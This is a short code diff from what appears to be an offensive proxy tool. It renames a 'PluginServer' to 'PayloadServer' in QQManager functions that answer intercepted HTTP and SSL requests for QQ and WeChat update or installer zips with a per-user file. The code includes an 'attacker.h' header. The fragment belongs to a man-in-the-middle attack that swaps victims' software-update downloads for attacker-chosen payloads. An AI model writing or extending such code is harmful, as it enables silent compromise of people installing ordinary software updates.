@@ -1,6 +1,6 @@
 
 #include "QQManager.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "../FileOper.h"
 #include <string>
@@ -86,7 +86,7 @@ int QQManager::replayQQManager(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM 
 		filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);
 	}
 
-	ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+	ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 	return 0;
 }
 ///dldir3.qq.comminigamefile/Game_setup.zip
@@ -130,7 +130,7 @@ int QQManager::replayQQManager(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM l
 		}
 	}
 
-	ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
+	ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
 	return 0;
 }
 
